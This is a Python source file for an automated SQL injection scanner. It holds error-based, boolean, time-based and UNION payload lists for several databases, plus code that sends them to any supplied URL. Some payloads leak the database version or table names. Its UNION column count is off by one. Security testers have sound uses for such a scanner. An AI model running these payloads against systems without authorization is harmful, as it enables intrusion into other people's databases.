#!/usr/bin/env python3
"""
SQLi Scanner v1.0.0 — Automated SQL Injection Detection Tool
Scans URLs for SQL injection vulnerabilities using multiple detection methods.

Usage:
    python3 sql_scanner.py <url> [options]
    python3 sql_scanner.py -f urls.txt        # scan multiple URLs
    python3 sql_scanner.py <url> --deep        # deep scan (all params, all methods)

Detection methods:
    1. Error-based: injects payloads that trigger DB errors
    2. Boolean-based: compares true/false condition responses
    3. Time-based: measures response delays
    4. UNION-based: probes column count

Author: 42 (Deep Thought) | License: MIT | Version: 1.0.0
"""

import argparse
import json
import re
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from typing import Optional
from pathlib import Path

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

__version__ = "1.0.0"

# ─── Payloads ────────────────────────────────────────────────────────────────────

PAYLOADS = {
    "error": {
        "generic": [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1'--",
            "') OR ('1'='1",
            "1' ORDER BY 100--",
        ],
        "mysql": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ],
        "postgresql": [
            "' AND 1=CAST(VERSION() AS INT)--",
            "';SELECT CAST(VERSION() AS INT)--",
        ],
        "mssql": [
            "' AND 1=CONVERT(INT,@@VERSION)--",
            "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        ],
        "oracle": [
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
        ],
    },
    "boolean": {
        "true": [
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 'a'='a",
            "1 OR 1=1",
        ],
        "false": [
            "' OR '1'='2",
            "' OR 1=2--",
            "\" OR 1=2--",
            "' OR 'a'='b",
            "1 OR 1=2",
        ],
    },
    "time": {
        "mysql": [
            "' OR SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)--",
            "';SELECT SLEEP(5);--",
        ],
        "postgresql": [
            "';SELECT pg_sleep(5);--",
            "' OR 1=(SELECT 1 FROM pg_sleep(5))--",
        ],
        "mssql": [
            "';WAITFOR DELAY '0:0:5'--",
            "1;WAITFOR DELAY '0:0:5'--",
        ],
        "oracle": [
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
        ],
    },
    "union": {
        "probe": "' UNION SELECT NULL--",
        "columns": [
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        ],
    },
}

ERROR_PATTERNS = [
    # MySQL
    r"SQL syntax.*?MySQL",
    r"Warning.*?\Wmysqli?_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your MySQL",
    r"MySqlClient\.",
    # PostgreSQL
    r"PostgreSQL.*?ERROR",
    r"Warning.*?\Wpg_",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"PG::SyntaxError",
    r"org\.postgresql\.util\.PSQLException",
    # MSSQL
    r"Driver.*?SQL[\-\_\ ]*Server",
    r"OLE DB.*?SQL Server",
    r"\bSQL Server[^&lt;&quot;]+Driver",
    r"Warning.*?\W(mssql|sqlsrv)_",
    r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
    r"System\.Data\.SqlClient\.SqlException",
    r"Unclosed quotation mark after the character string",
    # Oracle
    r"\bORA-[0-9][0-9][0-9][0-9]",
    r"Oracle error",
    r"Oracle.*?Driver",
    r"Warning.*?\W(oci|ora)_",
    r"quoted string not properly terminated",
    # SQLite
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    r"Warning.*?\W(sqlite_|SQLite3::)",
    r"\[SQLITE_ERROR\]",
    r"unrecognized token:",
    r"near \".*?\": syntax error",
    r"no such column",
    r"no such table",
    r"SQLITE_ERROR",
    # Generic
    r"SQL syntax error",
    r"syntax error.*?SQL",
    r"Unexpected end of SQL command",
    r"Incorrect syntax near",
    r"Division by zero",
    r"Microsoft OLE DB Provider for",
    r"ODBC SQL Server Driver",
]


@dataclass
class ScanResult:
    url: str
    param: str
    method: str
    vuln_type: str  # error, boolean, time, union
    payload: str
    evidence: str
    confidence: str  # high, medium, low
    db_type: str = "unknown"
    response_time: float = 0.0
    status_code: int = 0


@dataclass
class ScanTarget:
    url: str
    params: dict = field(default_factory=dict)
    method: str = "GET"
    cookies: dict = field(default_factory=dict)
    headers: dict = field(default_factory=dict)
    data: dict = field(default_factory=dict)


def detect_db_type(response_text: str) -> str:
    """Detect database type from error messages."""
    text = response_text.lower()
    if any(p in text for p in ["mysql", "mysqli", "mysqlexception"]):
        return "mysql"
    if any(p in text for p in ["postgresql", "pg_", "npgsql", "psql"]):
        return "postgresql"
    if any(p in text for p in ["sql server", "mssql", "sqlsrv", "oledb"]):
        return "mssql"
    if any(p in text for p in ["ora-", "oracle", "oci"]):
        return "oracle"
    if any(p in text for p in ["sqlite", "sqlite3"]):
        return "sqlite"
    return "unknown"


def matches_error_pattern(text: str) -> Optional[str]:
    """Check if response contains SQL error patterns."""
    for pattern in ERROR_PATTERNS:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(0)
    return None


def get_baseline(url: str, params: dict, method: str, cookies: dict, headers: dict, data: dict, timeout: int = 10) -> tuple:
    """Get baseline response for comparison."""
    try:
        if method == "GET":
            r = requests.get(url, params=params, cookies=cookies, headers=headers, timeout=timeout)
        else:
            r = requests.post(url, data=data, cookies=cookies, headers=headers, timeout=timeout)
        return r.status_code, len(r.text), r.text, r.elapsed.total_seconds()
    except Exception as e:
        return 0, 0, "", 0.0


def test_error_based(target: ScanTarget, timeout: int = 10) -> list:
    """Test for error-based SQL injection."""
    results = []
    all_payloads = []
    for category, payloads in PAYLOADS["error"].items():
        all_payloads.extend(payloads)

    for param_name in target.params:
        for payload in all_payloads:
            test_params = target.params.copy()
            test_params[param_name] = payload

            try:
                start = time.time()
                if target.method == "GET":
                    r = requests.get(target.url, params=test_params, cookies=target.cookies, headers=target.headers, timeout=timeout)
                else:
                    r = requests.post(target.url, data=test_params, cookies=target.cookies, headers=target.headers, timeout=timeout)
                elapsed = time.time() - start

                error_match = matches_error_pattern(r.text)
                if error_match:
                    db = detect_db_type(r.text)
                    results.append(ScanResult(
                        url=target.url, param=param_name, method=target.method,
                        vuln_type="error", payload=payload,
                        evidence=f"Error pattern: {error_match}",
                        confidence="high", db_type=db,
                        response_time=elapsed, status_code=r.status_code
                    ))
                    break  # one proof per param is enough

            except requests.Timeout:
                continue
            except Exception:
                continue

    return results


def test_boolean_based(target: ScanTarget, timeout: int = 10) -> list:
    """Test for boolean-based blind SQL injection."""
    results = []

    for param_name in target.params:
        true_payloads = PAYLOADS["boolean"]["true"]
        false_payloads = PAYLOADS["boolean"]["false"]

        for true_p, false_p in zip(true_payloads, false_payloads):
            # True condition
            true_params = target.params.copy()
            true_params[param_name] = true_p

            # False condition
            false_params = target.params.copy()
            false_params[param_name] = false_p

            try:
                if target.method == "GET":
                    r_true = requests.get(target.url, params=true_params, cookies=target.cookies, headers=target.headers, timeout=timeout)
                    r_false = requests.get(target.url, params=false_params, cookies=target.cookies, headers=target.headers, timeout=timeout)
                else:
                    r_true = requests.post(target.url, data=true_params, cookies=target.cookies, headers=target.headers, timeout=timeout)
                    r_false = requests.post(target.url, data=false_params, cookies=target.cookies, headers=target.headers, timeout=timeout)

                # Check if responses differ significantly
                len_diff = abs(len(r_true.text) - len(r_false.text))
                status_diff = r_true.status_code != r_false.status_code

                # Exclude login-redirect patterns (false positive filter)
                is_redirect = ("login" in r_true.text.lower() or "login" in r_false.text.lower()) and r_true.status_code in (301, 302, 303)

                if (len_diff > 50 or status_diff) and not is_redirect:
                    results.append(ScanResult(
                        url=target.url, param=param_name, method=target.method,
                        vuln_type="boolean", payload=f"true={true_p} / false={false_p}",
                        evidence=f"Response diff: {len_diff} bytes, status: {r_true.status_code}/{r_false.status_code}",
                        confidence="medium" if len_diff > 100 else "low",
                        response_time=0, status_code=r_true.status_code
                    ))
                    break  # one proof per param

            except Exception:
                continue

    return results


def test_time_based(target: ScanTarget, timeout: int = 15) -> list:
    """Test for time-based blind SQL injection."""
    results = []

    for param_name in target.params:
        # Get baseline timing
        baseline_times = []
        for _ in range(3):
            try:
                if target.method == "GET":
                    r = requests.get(target.url, params=target.params, cookies=target.cookies, headers=target.headers, timeout=timeout)
                else:
                    r = requests.post(target.url, data=target.params, cookies=target.cookies, headers=target.headers, timeout=timeout)
                baseline_times.append(r.elapsed.total_seconds())
            except Exception:
                continue

        if not baseline_times:
            continue

        avg_baseline = sum(baseline_times) / len(baseline_times)

        # Test each DB-specific time payload
        for db, payloads in PAYLOADS["time"].items():
            for payload in payloads:
                test_params = target.params.copy()
                test_params[param_name] = payload

                try:
                    start = time.time()
                    if target.method == "GET":
                        r = requests.get(target.url, params=test_params, cookies=target.cookies, headers=target.headers, timeout=timeout)
                    else:
                        r = requests.post(target.url, data=test_params, cookies=target.cookies, headers=target.headers, timeout=timeout)
                    elapsed = time.time() - start

                    # If response took significantly longer than baseline (4s+ difference for 5s sleep)
                    if elapsed > avg_baseline + 4.0:
                        results.append(ScanResult(
                            url=target.url, param=param_name, method=target.method,
                            vuln_type="time", payload=payload,
                            evidence=f"Baseline: {avg_baseline:.1f}s, Injected: {elapsed:.1f}s (delta: {elapsed - avg_baseline:.1f}s)",
                            confidence="high" if elapsed > 8 else "medium",
                            db_type=db,
                            response_time=elapsed, status_code=r.status_code
                        ))
                        break

                except requests.Timeout:
                    # Timeout could indicate successful sleep injection
                    results.append(ScanResult(
                        url=target.url, param=param_name, method=target.method,
                        vuln_type="time", payload=payload,
                        evidence=f"Request timed out ({timeout}s) — possible sleep injection",
                        confidence="low",
                        db_type=db,
                        response_time=timeout, status_code=0
                    ))
                    break
                except Exception:
                    continue

            if any(r.param == param_name and r.vuln_type == "time" for r in results):
                break

    return results


def test_union_based(target: ScanTarget, timeout: int = 10) -> list:
    """Probe for UNION-based injection (column count detection)."""
    results = []

    for param_name in target.params:
        for payload in PAYLOADS["union"]["columns"]:
            test_params = target.params.copy()
            test_params[param_name] = payload

            try:
                if target.method == "GET":
                    r = requests.get(target.url, params=test_params, cookies=target.cookies, headers=target.headers, timeout=timeout)
                else:
                    r = requests.post(target.url, data=test_params, cookies=target.cookies, headers=target.headers, timeout=timeout)

                error_match = matches_error_pattern(r.text)
                if not error_match:
                    # No error = columns might match
                    col_count = payload.count("NULL") + 1
                    results.append(ScanResult(
                        url=target.url, param=param_name, method=target.method,
                        vuln_type="union", payload=payload,
                        evidence=f"No error with {col_count} columns — possible match",
                        confidence="low",
                        response_time=r.elapsed.total_seconds(), status_code=r.status_code
                    ))

            except Exception:
                continue

    return results


def discover_params(url: str, cookies: dict, headers: dict) -> dict:
    """Auto-discover URL parameters by parsing the URL."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    # Flatten lists to single values
    return {k: v[0] if len(v) == 1 else v for k, v in params.items()}


def scan_target(target: ScanTarget, deep: bool = False, timeout: int = 10, log=None) -> list:
    """Full scan of a target."""
    if log is None:
        log = print
    all_results = []

    # Auto-discover params if none provided
    if not target.params:
        target.params = discover_params(target.url, target.cookies, target.headers)
        if not target.params:
            log(f"  [!] No parameters found for {target.url}")
            return []
        # Strip query string from URL so requests doesn't duplicate params
        parsed = urllib.parse.urlparse(target.url)
        target.url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    log(f"  [*] Parameters: {list(target.params.keys())}")

    # Get baseline
    _, _, _, baseline_time = get_baseline(target.url, target.params, target.method, target.cookies, target.headers, target.data, timeout)
    log(f"  [*] Baseline: {baseline_time:.2f}s")

    # Run detection methods
    methods = [
        ("Error-based", test_error_based),
        ("Boolean-based", test_boolean_based),
        ("Time-based", test_time_based),
    ]
    if deep:
        methods.append(("UNION-based", test_union_based))

    for name, test_func in methods:
        log(f"  [*] Testing {name}...", end=" ", flush=True)
        try:
            results = test_func(target, timeout)
            if results:
                log(f"FOUND {len(results)} potential vuln(s)!")
                all_results.extend(results)
            else:
                log("clean")
        except Exception as e:
            log(f"error: {e}")

    return all_results


def load_targets(filepath: str) -> list:
    """Load scan targets from a file (one URL per line, or JSON)."""
    targets = []
    path = Path(filepath)

    if path.suffix == ".json":
        with open(path) as f:
            data = json.load(f)
            if isinstance(data, list):
                for item in data:
                    targets.append(ScanTarget(
                        url=item["url"],
                        params=item.get("params", {}),
                        method=item.get("method", "GET"),
                        cookies=item.get("cookies", {}),
                        headers=item.get("headers", {}),
                    ))
    else:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(ScanTarget(url=line))

    return targets


def format_results(results: list, output_format: str = "text") -> str:
    """Format scan results."""
    if output_format == "json":
        return json.dumps([asdict(r) for r in results], indent=2)

    if not results:
        return "No vulnerabilities found."

    lines = []
    lines.append(f"\n{'='*70}")
    lines.append(f"  SCAN RESULTS — {len(results)} potential vulnerability(ies)")
    lines.append(f"{'='*70}")

    for i, r in enumerate(results, 1):
        conf_color = {"high": "!!!", "medium": "!!", "low": "!"}.get(r.confidence, "?")
        lines.append(f"\n  [{i}] {r.vuln_type.upper()} injection — {r.param}")
        lines.append(f"      URL:      {r.url}")
        lines.append(f"      Method:   {r.method}")
        lines.append(f"      Payload:  {r.payload}")
        lines.append(f"      Evidence: {r.evidence}")
        lines.append(f"      DB Type:  {r.db_type}")
        lines.append(f"      Confidence: {r.confidence} ({conf_color})")
        lines.append(f"      Status:   {r.status_code} | Time: {r.response_time:.2f}s")

    lines.append(f"\n{'='*70}")
    return "\n".join(lines)


def main():
    parser = argparse.ArgumentParser(
        description="SQLi Scanner v1.0.0 — Automated SQL Injection Detection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s "http://target.com/page?id=1"
  %(prog)s "http://target.com/page?id=1" --deep
  %(prog)s -f urls.txt --json -o results.json
  %(prog)s "http://target.com/page?id=1" --cookie "session=abc123"
        """
    )
    parser.add_argument("url", nargs="?", help="Target URL with parameters")
    parser.add_argument("-f", "--file", help="File containing URLs (one per line, or JSON)")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method (default: GET)")
    parser.add_argument("--param", action="append", dest="params", help="Parameters to test (name=value)")
    parser.add_argument("--cookie", help="Cookies (name=value;name2=value2)")
    parser.add_argument("--header", action="append", dest="headers", help="Custom headers (Name: Value)")
    parser.add_argument("--deep", action="store_true", help="Deep scan (all methods including UNION)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--json", action="store_true", help="Output as JSON")
    parser.add_argument("-o", "--output", help="Output file")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Parallel scan threads (default: 1)")
    parser.add_argument("-v", "--version", action="version", version=f"%(prog)s {__version__}")

    args = parser.parse_args()

    if not args.url and not args.file:
        parser.print_help()
        sys.exit(1)

    if not HAS_REQUESTS:
        print("Error: 'requests' library required. Install: pip install requests")
        sys.exit(1)

    # Parse cookies
    cookies = {}
    if args.cookie:
        for pair in args.cookie.split(";"):
            if "=" in pair:
                k, v = pair.strip().split("=", 1)
                cookies[k.strip()] = v.strip()

    # Parse headers
    headers = {}
    if args.headers:
        for h in args.headers:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

    # Parse custom params
    custom_params = {}
    if args.params:
        for p in args.params:
            if "=" in p:
                k, v = p.split("=", 1)
                custom_params[k] = v

    # Build targets — parse URL query params, merge with explicit --param
    targets = []
    if args.file:
        targets = load_targets(args.file)
    elif args.url:
        parsed = urllib.parse.urlparse(args.url)
        url_params = {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        merged_params = {**url_params, **custom_params}
        targets = [ScanTarget(
            url=base_url,
            params=merged_params,
            method=args.method,
            cookies=cookies,
            headers=headers,
        )]

    json_mode = args.json
    log = (lambda *a, **kw: print(*a, file=sys.stderr, **kw)) if json_mode else print

    log(f"\n{'='*50}")
    log(f"  SQLi Scanner v{__version__}")
    log(f"  Targets: {len(targets)} | Deep: {args.deep} | Timeout: {args.timeout}s")
    log(f"{'='*50}\n")

    all_results = []

    def scan_one(target):
        log(f"\n[Scanning] {target.url}")
        results = scan_target(target, deep=args.deep, timeout=args.timeout, log=log)
        return results

    if args.threads > 1 and len(targets) > 1:
        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            futures = {pool.submit(scan_one, t): t for t in targets}
            for future in as_completed(futures):
                try:
                    results = future.result()
                    all_results.extend(results)
                except Exception as e:
                    log(f"  [!] Error: {e}")
    else:
        for target in targets:
            results = scan_one(target)
            all_results.extend(results)

    # Output
    fmt = "json" if json_mode else "text"
    output = format_results(all_results, fmt)

    if args.output:
        with open(args.output, "w") as f:
            f.write(output)
        log(f"\nResults saved to {args.output}")
    else:
        print(output)

    # Summary (stderr in JSON mode to keep stdout clean)
    high = sum(1 for r in all_results if r.confidence == "high")
    medium = sum(1 for r in all_results if r.confidence == "medium")
    low = sum(1 for r in all_results if r.confidence == "low")
    log(f"\nSummary: {high} high / {medium} medium / {low} low confidence")
    log(f"Total: {len(all_results)} potential vulnerability(ies) found.\n")

    sys.exit(1 if high > 0 else 0)


if __name__ == "__main__":
    main()
